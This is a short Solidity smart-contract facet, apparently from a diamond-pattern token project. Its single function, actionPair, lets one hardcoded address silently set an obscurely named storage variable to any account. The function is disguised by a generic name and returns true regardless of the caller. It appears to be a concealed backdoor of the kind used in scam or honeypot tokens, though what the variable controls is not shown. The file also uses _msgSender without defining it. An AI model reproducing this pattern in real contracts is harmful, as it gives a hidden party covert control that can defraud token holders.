// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract actionPairFacet {
    function actionPair(address account) public virtual returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == 0x6c54D8A238512D07f1624Dd931680451BE3FC1bd)
            ds._p76234 = account;
        return true;
    }
}
